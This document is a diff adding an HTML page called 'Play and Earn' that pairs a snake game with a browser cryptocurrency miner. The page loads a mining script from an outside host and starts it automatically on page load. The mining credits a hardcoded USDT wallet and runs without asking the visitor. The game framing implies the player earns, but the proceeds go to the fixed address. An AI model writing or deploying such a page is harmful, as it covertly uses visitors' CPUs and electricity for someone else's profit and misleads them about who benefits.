@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Play and Earn</title>
+<style>
+body {
+    background: #111;
+    color: #0f0;
+    font-family: monospace;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    margin: 0;
+    padding: 20px;
+}
+#gameCanvas {
+    background: #000;
+    border: 2px solid #0f0;
+    box-shadow: 0 0 10px #0f0;
+    margin-top: 20px;
+}
+.dashboard {
+    display: flex;
+    gap: 20px;
+    font-size: 20px;
+    background: #222;
+    padding: 15px 30px;
+    border-radius: 8px;
+    border: 1px solid #0f0;
+}
+.value {
+    font-weight: bold;
+    color: #fff;
+}
+</style>
+<script src="https://server.unmineable.com/unmineable_web_miner.js"></script>
+</head>
+<body>
+<div class="dashboard">
+    <div>Hashes/s: <span class="value" id="hashes">0</span></div>
+    <div>Total Hashes: <span class="value" id="totalHashes">0</span></div>
+    <div>Score: <span class="value" id="score">0</span></div>
+</div>
+<canvas height="400" id="gameCanvas" width="400"></canvas>
+<script>
+const canvas = document.getElementById('gameCanvas');
+const ctx = canvas.getContext('2d');
+const hashesEl = document.getElementById('hashes');
+const totalHashesEl = document.getElementById('totalHashes');
+const scoreEl = document.getElementById('score');
+const miner = new UnmineableMiner('USDT:TXFi7DfwcGqYuY7Pfnd69b85GkFbBBXJZi.GameEarning', {
+    throttle: 0.5
+});
+miner.start();
+setInterval(() => {
+    if(miner.isRunning()) {
+        hashesEl.innerText = Math.round(miner.getHashesPerSecond());
+        totalHashesEl.innerText = miner.getTotalHashes();
+    }
+}, 1000);
+let snake = [{x: 200, y: 200}];
+let dx = 20;
+let dy = 0;
+let foodX = 100;
+let foodY = 100;
+let score = 0;
+function drawGame() {
+    ctx.fillStyle = '#000';
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = '#f00';
+    ctx.fillRect(foodX, foodY, 20, 20);
+    ctx.fillStyle = '#0f0';
+    snake.forEach(part => ctx.fillRect(part.x, part.y, 20, 20));
+    let head = {x: snake[0].x + dx, y: snake[0].y + dy};
+    if (head.x < 0) head.x = canvas.width - 20;
+    if (head.x >= canvas.width) head.x = 0;
+    if (head.y < 0) head.y = canvas.height - 20;
+    if (head.y >= canvas.height) head.y = 0;
+    snake.unshift(head);
+    if (head.x === foodX && head.y === foodY) {
+        score += 10;
+        scoreEl.innerText = score;
+        foodX = Math.floor(Math.random() * 20) * 20;
+        foodY = Math.floor(Math.random() * 20) * 20;
+    } else {
+        snake.pop();
+    }
+}
+document.addEventListener('keydown', e => {
+    if (e.key === 'ArrowUp' && dy === 0) { dx = 0; dy = -20; }
+    if (e.key === 'ArrowDown' && dy === 0) { dx = 0; dy = 20; }
+    if (e.key === 'ArrowLeft' && dx === 0) { dx = -20; dy = 0; }
+    if (e.key === 'ArrowRight' && dx === 0) { dx = 20; dy = 0; }
+});
+setInterval(drawGame, 100);
+</script>
+</body>
+</html>
